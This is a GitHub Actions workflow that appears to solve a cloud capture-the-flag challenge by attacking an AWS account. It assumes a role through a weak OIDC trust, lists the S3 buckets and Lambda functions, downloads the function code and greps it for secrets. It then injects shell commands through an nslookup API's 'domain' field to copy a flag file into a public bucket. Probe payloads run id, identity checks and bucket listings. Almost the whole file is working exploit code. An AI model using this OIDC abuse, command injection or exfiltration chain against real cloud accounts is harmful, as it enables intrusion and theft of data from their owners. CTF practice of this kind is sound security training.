name: have-some-faith

on:
  workflow_dispatch:
    inputs:
      api_url:
        description: "Exact challenge API URL from the provided site, for example https://.../stage/path"
        required: false
        type: string
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

env:
  AWS_REGION: us-east-1
  TARGET_ROLE_ARN: arn:aws:iam::009661764077:role/cicdRole
  CHALLENGE_API_URL: https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup

jobs:
  enumerate:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials through vulnerable OIDC trust
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ env.TARGET_ROLE_ARN }}
          role-session-name: have-some-faith
          aws-region: ${{ env.AWS_REGION }}

      - name: Confirm identity
        run: aws sts get-caller-identity

      - name: Enumerate S3 and Lambda
        shell: bash
        run: |
          set -euo pipefail

          mkdir -p out/lambda

          echo "== Buckets =="
          aws s3api list-buckets --query 'Buckets[].Name' --output text || true

          for bucket in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
            echo "== Bucket policy: $bucket =="
            aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text || true

            echo "== Bucket policy status: $bucket =="
            aws s3api get-bucket-policy-status --bucket "$bucket" --output json || true

            echo "== Bucket objects: $bucket =="
            aws s3api list-objects-v2 --bucket "$bucket" \
              --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
              --output table || true
          done

          echo "== Functions =="
          aws lambda list-functions \
            --query 'Functions[].{Name:FunctionName,Runtime:Runtime,Handler:Handler,Role:Role,LastModified:LastModified,Env:Environment.Variables}' \
            --output json

          aws lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' |
          while read -r fn; do
            test -n "$fn" || continue
            echo "== Inspecting Lambda: $fn =="

            echo "== Lambda resource policy: $fn =="
            aws lambda get-policy --function-name "$fn" --output json || true

            echo "== Lambda configuration: $fn =="
            aws lambda get-function-configuration --function-name "$fn" --output json > "out/lambda/$fn.config.json" || true
            cat "out/lambda/$fn.config.json" || true

            code_url="$(aws lambda get-function --function-name "$fn" --query 'Code.Location' --output text || true)"
            if [[ "$code_url" != "None" && -n "$code_url" ]]; then
              curl -fsSL "$code_url" -o "out/lambda/$fn.zip" || true
              unzip -q -o "out/lambda/$fn.zip" -d "out/lambda/$fn" || true
              echo "== Lambda package files: $fn =="
              find "out/lambda/$fn" -maxdepth 4 -type f -print || true
            fi
          done

          echo "== Flag grep =="
          grep -RInaE 'flag|ctf|HTB|THM|pico|faith|secret|password|token|key' out || true

      - name: Enumerate public front doors
        shell: bash
        run: |
          set -euo pipefail

          echo "== CloudFront distributions =="
          aws cloudfront list-distributions --output json || true

          echo "== API Gateway v1 APIs =="
          aws apigateway get-rest-apis --output json || true

          echo "== API Gateway v2 APIs =="
          aws apigatewayv2 get-apis --output json || true

          echo "== Lambda function URL config =="
          aws lambda get-function-url-config --function-name nslookupv2 --output json || true

      - name: Scoped exploit using only the challenge front door
        shell: bash
        run: |
          set -euo pipefail

          site_base="https://d67nf28gqfurd.cloudfront.net"
          public_bucket="platform-bucket-009661764077-us-east-1"
          flag_bucket="codec4f26c862a321ef5"
          out_key="faith-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.txt"
          exfil_url="s3://${public_bucket}/${out_key}"
          command="example.com; /opt/aws s3 cp s3://${flag_bucket}/flag.txt ${exfil_url}; #"

          echo "== Read provided challenge site for API route =="
          curl -ksS -m 10 "${site_base}/index.html" -o out/site-index.html || true
          curl -ksS -m 10 "${site_base}/js/scripts.js" -o out/site-scripts.js || true
          grep -RInaE 'execute-api|3q931syi7b|fetch|XMLHttpRequest|axios|domain|lookup|nslookup|api' out/site-* || true

          input_url="${{ github.event.inputs.api_url }}"
          discovered_url="$(grep -RaoE 'https://3q931syi7b\.execute-api\.us-east-1\.amazonaws\.com[^"'"'"'` )]+' out/site-* 2>/dev/null | head -n 1 || true)"
          api_url="${input_url:-${discovered_url:-$CHALLENGE_API_URL}}"

          if [[ -z "$api_url" ]]; then
            echo "No exact API URL discovered. Open ${site_base}/js/scripts.js from an Israeli IP and rerun workflow_dispatch with api_url."
            exit 1
          fi

          echo "== Using API URL: $api_url =="

          check_flag() {
            if aws s3api head-object --bucket "$public_bucket" --key "$out_key" >/dev/null 2>&1; then
              echo "== Exfil succeeded: s3://${public_bucket}/${out_key} =="
              aws s3 cp "s3://${public_bucket}/${out_key}" -
              return 0
            fi
            return 1
          }

          echo "== Calling exact challenge API URL =="
          curl -ksS -m 10 -X POST \
            -H 'content-type: application/json' \
            --data "{\"domain\":\"${command}\"}" \
            "$api_url" || true
          echo

          if check_flag; then
            exit 0
          fi

          echo "== Exfil object not found after scoped API call =="
          aws s3api list-objects-v2 --bucket "$public_bucket" \
            --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
            --output table || true
          exit 1

      - name: Probe command injection
        shell: bash
        run: |
          set -euo pipefail

          invoke() {
            local label="$1"
            local payload="$2"
            echo "== Invoke: $label =="
            aws lambda invoke \
              --function-name nslookupv2 \
              --cli-binary-format raw-in-base64-out \
              --payload "$payload" \
              "out/${label}.response.json" || true
            cat "out/${label}.response.json" || true
            echo
          }

          mkdir -p out

          invoke "id" '{"domain":"example.com; id; #"}'
          invoke "caller" '{"domain":"example.com; /opt/aws sts get-caller-identity; aws sts get-caller-identity; python -m awscli sts get-caller-identity; #"}'
          invoke "s3ls" '{"domain":"example.com; /opt/aws s3 ls; aws s3 ls; python -m awscli s3 ls; #"}'
          invoke "findflag" '{"domain":"example.com; /opt/aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive; /opt/aws s3 ls s3://codec4f26c862a321ef5 --recursive; /opt/aws s3 ls s3://site781fe43f26b9eba3 --recursive; #"}'

      - name: Try CloudWatch log read
        shell: bash
        run: |
          set -euo pipefail

          log_group="/aws/lambda/nslookupv2"
          echo "== Log streams =="
          aws logs describe-log-streams \
            --log-group-name "$log_group" \
            --order-by LastEventTime \
            --descending \
            --max-items 5 \
            --output json || true

          stream="$(aws logs describe-log-streams \
            --log-group-name "$log_group" \
            --order-by LastEventTime \
            --descending \
            --max-items 1 \
            --query 'logStreams[0].logStreamName' \
            --output text 2>/dev/null || true)"

          if [[ "$stream" != "None" && -n "$stream" ]]; then
            echo "== Recent log events from $stream =="
            aws logs get-log-events \
              --log-group-name "$log_group" \
              --log-stream-name "$stream" \
              --limit 100 \
              --query 'events[].message' \
              --output text || true
          fi
